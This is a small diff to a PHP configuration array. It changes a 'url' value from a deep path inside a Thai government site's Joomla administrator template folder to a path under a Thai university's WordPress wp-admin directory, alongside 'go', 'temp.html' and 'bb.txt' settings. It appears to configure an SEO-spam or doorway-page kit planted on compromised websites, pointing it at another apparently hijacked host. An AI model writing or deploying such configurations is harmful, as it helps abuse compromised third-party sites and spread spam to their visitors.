@@ -1,6 +1,6 @@
 <?php
 $config = array(
-  	'url'		=> 'https://www.lp-pao.go.th/Main60/administrator/templates/hathor/html/com_admin/sysinfo/asia/',
+  	'url'		=> 'https://nurse.sskru.ac.th/wp-admin/maint/amp/',
 	'parameter' => 'go',
 	'template'  => 'temp.html',
 	'keywords'  => 'bb.txt',
